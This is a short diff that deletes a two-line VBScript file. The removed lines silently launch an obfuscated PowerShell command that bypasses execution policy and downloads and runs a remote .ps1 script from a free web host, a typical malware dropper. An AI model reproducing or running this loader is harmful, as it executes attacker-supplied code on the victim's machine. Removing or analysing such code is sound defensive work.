@@ -1,2 +1,0 @@
-Set objShell = CreateObject("Wscript.shell")
-objShell.Run("powershell.exe -exec Bypass -C  i`EX(NeW-`o`BjECt net.WebclIEnT).DownloadString(('http'+'s'+'://skid'+'oa'+'s'+'h'+'hh'+'h.00'+'0w'+'e'+'bhostapp'+'.com/valentino.'+'p'+'s1'))"),0
